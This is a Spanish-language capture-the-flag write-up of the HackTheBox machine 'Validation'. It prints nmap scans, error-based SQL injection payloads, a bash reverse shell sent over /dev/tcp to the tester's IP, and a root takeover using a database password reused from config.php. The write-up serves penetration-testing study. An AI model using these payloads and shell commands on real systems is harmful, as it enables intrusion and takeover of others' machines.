---
title: "Validation"
description: "Máquina Validation de Hackthebox"
date: 2024-07-01 21:47:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - Information Leakag
  - SQLI (Error Based)
  - SQL (Into Outfile)
image:
  path: /assets/img/Validation/Validation.png
---

## Skills

- SQLI (Error Based)
- SQLI -> RCE (INTO OUTFILE)
- Information Leakage
  
## Certificaciones

- eJPT
- eWPT
  
## Descripción

`Validarion` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de una `sql injection into outfile` encontrada en su página web, obtendremos `acceso` a la `máquina víctima` mediante la creación de un `archivo .php` que nos permitirá `ejecución de comandos`, escalaremos privilegios debido a información privilegiada encontrada en un archivo de configuración

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.95.235 
PING 10.129.95.235 (10.129.95.235) 56(84) bytes of data.
64 bytes from 10.129.95.235: icmp_seq=1 ttl=63 time=58.1 ms
^C
--- 10.129.95.235 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 58.104/58.104/58.104/0.000 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.95.235 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 11:51 CEST
Initiating SYN Stealth Scan at 11:51
Scanning 10.129.95.235 [65535 ports]
Discovered open port 8080/tcp on 10.129.95.235
Discovered open port 22/tcp on 10.129.95.235
Discovered open port 80/tcp on 10.129.95.235
Discovered open port 4566/tcp on 10.129.95.235
Completed SYN Stealth Scan at 11:52, 13.45s elapsed (65535 total ports)
Nmap scan report for 10.129.95.235
Host is up (0.15s latency).
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4566/tcp open  kwtc
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
           Raw packets sent: 65966 (2.903MB) | Rcvd: 65990 (2.640MB)
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p22,80,4566,8080 10.129.95.235 -oN services                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-02 11:53 CEST
Nmap scan report for 10.129.95.235
Host is up (0.087s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
```

### Web Enumeration

Nos dirigimos a la página web y se visualiza lo siguiente:

![](/assets/img/Validation/image_1.png)

Cuando `añadimos` un `username` vemos esto en la ruta `/contact.php`

![](/assets/img/Validation/image_2.png)

He testeado una `inyección sql` en la parte del username pero no ha dado resultado, sin embargo, al probarla en la parte del `country` si que nos ha `devuelto` un `error`, por lo tanto estamos antes una `sql injection error based`

![](/assets/img/Validation/image_3.png)

Ahora vemos que no se ve el error

```
# username=test&country=Brazil'
```

![](/assets/img/Validation/image_4.png)

Nos encontramos ante `una` sola `columna`, debido a que si hacemos un order by 2 nos da error

```
# username=test&country=Brazil' order by 1-- - 
```

![](/assets/img/Validation/image_5.png)

`Identificamos` la `versión` y el `tipo base de datos` a la que nos enfrentamos

```
# username=test&country=Brazil' union select version()-- - 
```

![](/assets/img/Validation/image_6.png)

Vemos la `base de datos` sobre la que estamos realizando la inyección, es decir la que se está `utilizando`

```
# username=test&country=Brazil' union select database()-- - 
```

![](/assets/img/Validation/image_7.png)

`Listamos` todas las `bases de datos`

```
# username=test&country=Brazil' union select schema_name from information_schema.schemata-- - 
```

![](/assets/img/Validation/image_8.png)

`Listamos` el nombre de todas las `tablas` que pertenecen a la base de datos registration

```
# username=test&country=Brazil' union select table_name from information_schema.tables where table_schema='registration'-- - 
```

![](/assets/img/Validation/image_9.png)

`Listamos` todas las `columnas` para la base de datos registration y la tabla registration

```
# username=test&country=Brazil' union select column_name from information_schema.columns where table_schema='registration'-- - 
```

![](/assets/img/Validation/image_10.png)

Comprobamos si hay algo interesante en las tablas `username` y `userhash`, pero no encontramos nada

![](/assets/img/Validation/image_11.png)

Usando `wfuzz` hemos encontrado la ruta `/config.php`, si conseguimos ganar acceso a la máquina víctima quizá en este archivo exista información interesante

```
# wfuzz -c -t100 --hc 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.95.235/FUZZ.php
 /home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.95.235/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000001:   200        268 L    747 W      16088 Ch    "# directory-list-2.3-medium.txt"                                                                                     
000000003:   200        268 L    747 W      16088 Ch    "# Copyright 2007 James Fisher"                                                                                       
000000007:   200        268 L    747 W      16088 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                     
000000013:   200        268 L    747 W      16088 Ch    "#"                                                                                                                   
000000015:   200        268 L    747 W      16088 Ch    "index"                                                                                                               
000000012:   200        268 L    747 W      16088 Ch    "# on at least 2 different hosts"                                                                                     
000000011:   200        268 L    747 W      16088 Ch    "# Priority ordered case-sensitive list, where entries were found"                                                    
000000010:   200        268 L    747 W      16088 Ch    "#"                                                                                                                   
000000006:   200        268 L    747 W      16088 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                       
000000009:   200        268 L    747 W      16088 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                 
000000008:   200        268 L    747 W      16088 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                          
000000004:   200        268 L    747 W      16088 Ch    "#"                                                                                                                   
000000005:   200        268 L    747 W      16088 Ch    "# This work is licensed under the Creative Commons"                                                                  
000000349:   200        0 L      2 W        16 Ch       "account"                                                                                                             
000000002:   200        268 L    747 W      16088 Ch    "#"                                                                                                                   
000001490:   200        0 L      0 W        0 Ch        "config"                                                                                                              

Total time: 216.6545
Processed Requests: 220560
Filtered Requests: 220544
Requests/sec.: 1018.026
```

## Intrusión

Al acceder a la ruta `/config.php` no vemos nada porque el `código` php está siendo `interpretado`, sin embargo, podemos ver si a través de la inyección sql tenemos `permisos` de `escritura`, si es así podremos `inyectar código php` en algún archivo de esa ruta y ganar acceso a la máquina víctima

![](/assets/img/Validation/image_12.png)

Efectivamente ha funcionado, al acceder a `http://10.129.250.24/shell.php?cmd=whoami` comprobamos que tenemos ejecución de comandos

![](/assets/img/Validation/image_13.png)

Por lo tanto vamos a mandarnos una `reverse shell` a nuestro equipo, lo primero es ponernos en escucha mediante `netcat` por el puerto `443`

```
# nc -nlvp 443
```

Nos mandamos una `reverse shell` a nuestro equipo

```
# http://10.129.250.24/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.15/443 0>%261"
```

Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`

```
# nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.250.24] 43028
sh: 0: can't access tty; job control turned off
$ 
```

Obtenemos las `dimensiones` de nuestra `pantalla` 

```
# stty size
45 183
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

Ya tenemos un `consola` completamente `interactiva`

```
www-data@validation:/var/www/html$ whoami
www-data
```

## Privilege Escalation

Lo siguiente que hacemos es `inspeccionar` el `config.php` que hemos encontrado y encontramos las `credenciales` del `usuario` uhc a la base de datos

```
www-data@validation:/var/www/html$ cat config.php 
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Al inspeccionar el `/etc/passwd` nos damos cuenta que el único usuario que hay posible es root, así que probamos la contraseña `uhc-9qual-global-pw` para convertirnos en usuario `root` y funciona

```
www-data@validation:/var/www/html$ su root
Password: 
root@validation:/var/www/html# whoami
root
```
